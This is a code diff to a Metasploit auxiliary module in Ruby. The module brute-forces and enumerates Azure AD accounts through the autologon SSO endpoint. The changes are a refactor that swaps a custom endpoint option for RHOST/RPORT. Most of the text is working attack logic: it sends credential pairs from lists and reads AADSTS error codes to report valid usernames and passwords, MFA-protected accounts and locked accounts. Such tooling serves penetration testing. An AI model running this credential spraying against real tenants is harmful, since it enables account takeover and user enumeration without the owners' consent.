@@ -28,28 +28,29 @@ class MetasploitModule < Msf::Auxiliary
       'DefaultOptions' => {
         'RPORT' => 443,
         'SSL' => true,
-        'RHOSTS' => '127.0.0.1' # We don't actually use this, because the azure endpoint is what we want
+        'RHOST' => 'autologon.microsoftazuread-sso.com'
       }
     )
 
     register_options(
       [
+        OptString.new('RHOST', [true, 'The target Azure endpoint', 'autologon.microsoftazuread-sso.com']),
         OptString.new('DOMAIN', [true, 'The target Azure AD domain', '']),
-        OptString.new('AZURE_ENDPOINT', [true, 'The Azure Autologon endpoint', 'autologon.microsoftazuread-sso.com']),
         OptString.new('TARGETURI', [ true, 'The base path to the Azure autologon endpoint', '/winauth/trust/2005/usernamemixed']),
       ]
     )
 
     deregister_options('PASSWORD_SPRAY', 'VHOST', 'USER_AS_PASS',
                        'USERPASS_FILE', 'STOP_ON_SUCCESS', 'Proxies',
-                       'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'BLANK_PASSWORDS')
+                       'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS',
+                       'BLANK_PASSWORDS', 'RHOSTS')
   end
 
-  def report_login(azure_endpoint, domain, username, password)
+  def report_login(rhost, rport, domain, username, password)
     # report information, if needed
     service_data = {
-      address: azure_endpoint,
-      port: 443,
+      address: rhost,
+      port: rport,
       service_name: 'Azure AD',
       protocol: 'http'
     }
@@ -70,9 +71,9 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def check_login(azure_endpoint, targeturi, domain, username, password)
+  def check_login(rhost, rport, targeturi, domain, username, password)
     request_id = SecureRandom.uuid
-    url = "https://autologon.microsoftazuread-sso.com/#{domain}#{targeturi}"
+    url = "https://#{rhost}/#{domain}#{targeturi}"
 
     created = Time.new.inspect
     expires = (Time.new + 600).inspect
@@ -113,7 +114,6 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_raw({
       'uri' => "/#{domain}#{targeturi}",
       'method' => 'POST',
-      'rhost' => azure_endpoint,
       'vars_get' => {
         'client-request-id' => request_id
       },
@@ -133,19 +133,19 @@ class MetasploitModule < Msf::Auxiliary
     if xml.xpath('//DesktopSsoToken')[0]
       print_good("Login #{domain}\\#{username}:#{password} is valid!")
       print_good("Desktop SSO Token: #{auth_details}")
-      report_login(azure_endpoint, domain, username, password)
+      report_login(rhost, rport, domain, username, password)
     elsif auth_details.start_with?('AADSTS50126') # Valid user but incorrect password
       print_good("Password #{password} is invalid but #{domain}\\#{username} is valid!")
-      report_login(azure_endpoint, domain, username, nil)
+      report_login(rhost, rport, domain, username, nil)
     elsif auth_details.start_with?('AADSTS50056') # User exists without a password in Azure AD
       print_good("#{domain}\\#{username} is valid but the user does not have a password in Azure AD!")
-      report_login(azure_endpoint, domain, username, nil)
+      report_login(rhost, rport, domain, username, nil)
     elsif auth_details.start_with?('AADSTS50076') # User exists, but you need MFA to connect to this resource
       print_good("Login #{domain}\\#{username}:#{password} is valid, but you need MFA to connect to this resource")
-      report_login(azure_endpoint, domain, username, password)
+      report_login(rhost, rport, domain, username, password)
     elsif auth_details.start_with?('AADSTS50014') # User exists, but the maximum Pass-through Authentication time was exceeded
       print_good("#{domain}\\#{username} is valid but the maximum pass-through authentication time was exceeded")
-      report_login(azure_endpoint, domain, username, nil)
+      report_login(rhost, rport, domain, username, nil)
     elsif auth_details.start_with?('AADSTS50034') # User does not exist
       print_error("#{domain}\\#{username} is not a valid user")
     elsif auth_details.start_with?('AADSTS50053') # Account is locked
@@ -155,15 +155,16 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def check_logins(azure_endpoint, targeturi, domain, usernames, passwords)
+  def check_logins(rhost, rport, targeturi, domain, usernames, passwords)
     for username in usernames do
       for password in passwords do
-        check_login(azure_endpoint, targeturi, domain, username.strip.encode(xml: :text), password.strip.encode(xml: :text))
+        check_login(rhost, rport, targeturi, domain,
+                    username.strip.encode(xml: :text), password.strip.encode(xml: :text))
       end
     end
   end
 
-  def run_host(_ip)
+  def run
     # Check whether the username is a file or string, stick either in an array
     if datastore.include? 'USER_FILE'
       usernames = File.readlines(datastore['USER_FILE'])
@@ -176,6 +177,7 @@ class MetasploitModule < Msf::Auxiliary
       passwords = [datastore['PASSWORD']]
     end
 
-    check_logins(datastore['AZURE_ENDPOINT'], datastore['TARGETURI'], datastore['DOMAIN'], usernames, passwords)
+    check_logins(datastore['RHOST'], datastore['RPORT'], datastore['TARGETURI'],
+                 datastore['DOMAIN'], usernames, passwords)
   end
 end
